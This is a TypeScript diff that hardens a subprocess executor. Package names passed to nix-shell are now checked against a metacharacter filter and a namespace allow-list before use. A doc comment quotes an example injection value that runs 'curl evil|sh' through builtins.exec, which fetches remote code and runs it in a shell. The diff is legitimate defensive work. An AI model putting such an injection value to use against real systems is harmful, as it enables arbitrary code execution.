@@ -39,6 +39,54 @@ function shellQuote(value: string): string {
   return `'${value.replace(/'/g, `'\\''`)}'`;
 }
 
+// Kept in lockstep with the gateway's nixPackageAttrRef allow-list
+// (packages/server/src/gateway/orchestration/impl/embedded-deployment.ts).
+const NIX_PACKAGE_NAMESPACES = new Set([
+  'python3Packages',
+  'python311Packages',
+  'python312Packages',
+  'nodePackages',
+  'perlPackages',
+  'rubyPackages',
+  'haskellPackages',
+  'rPackages',
+  'ocamlPackages',
+  'luaPackages',
+]);
+const NIX_LEAF_RE = /^[a-z0-9_][a-z0-9_-]*$/;
+const NIX_ATTR_LEAF_RE = /^[a-zA-Z0-9_][a-zA-Z0-9_-]*$/;
+
+/**
+ * Validate an operator/connector-declared nix package name and re-emit it as an
+ * explicit `pkgs.<...>` attribute reference. `nix-shell -p` evaluates each
+ * argument as a Nix *expression*, so an unvalidated value like
+ * `x; builtins.exec ["sh" "-c" "curl evil|sh"]` or `import ./evil.nix` would
+ * run arbitrary code at evaluation time. Mirrors the gateway-side
+ * `nixPackageAttrRef` hardening so the connector path is not a weaker door.
+ */
+export function nixPackageAttrRef(pkg: string): string {
+  if (typeof pkg !== 'string' || /[\s;&|`$(){}<>'"\\!*?#]/.test(pkg)) {
+    throw new Error(`Invalid nix package name: ${pkg}`);
+  }
+  const dot = pkg.indexOf('.');
+  if (dot === -1) {
+    if (!NIX_LEAF_RE.test(pkg)) {
+      throw new Error(`Invalid nix package name: ${pkg}`);
+    }
+    return `pkgs.${pkg}`;
+  }
+  const namespace = pkg.slice(0, dot);
+  const leaf = pkg.slice(dot + 1);
+  if (
+    !NIX_PACKAGE_NAMESPACES.has(namespace) ||
+    leaf.includes('.') ||
+    !NIX_ATTR_LEAF_RE.test(leaf)
+  ) {
+    throw new Error(`Invalid nix package name: ${pkg}`);
+  }
+  return `pkgs.${namespace}.${leaf}`;
+}
+
 /**
  * exit_reason values surfaced to the runs table:
  *  - ok: successful 'result' IPC.
@@ -205,7 +253,11 @@ export class SubprocessExecutor implements SyncExecutor {
         // impure shell keeps the ambient PATH, so `node` still resolves.
         const nodeCmd = ['exec', 'node', ...execArgv, shellQuote(childRunnerPath)].join(' ');
         const nixArgs: string[] = [];
-        for (const pkg of nixPackages) nixArgs.push('-p', pkg);
+        // SECURITY: validate + normalize every package name. `nix-shell -p`
+        // evaluates each argument as a Nix expression, so a raw value could run
+        // arbitrary code at eval time. nixPackageAttrRef rejects metacharacters
+        // and re-emits a strict `pkgs.<...>` attr reference.
+        for (const pkg of nixPackages) nixArgs.push('-p', nixPackageAttrRef(pkg));
         nixArgs.push('--run', nodeCmd);
         child = spawn('nix-shell', nixArgs, {
           stdio: ['pipe', 'pipe', 'pipe', 'ipc'],
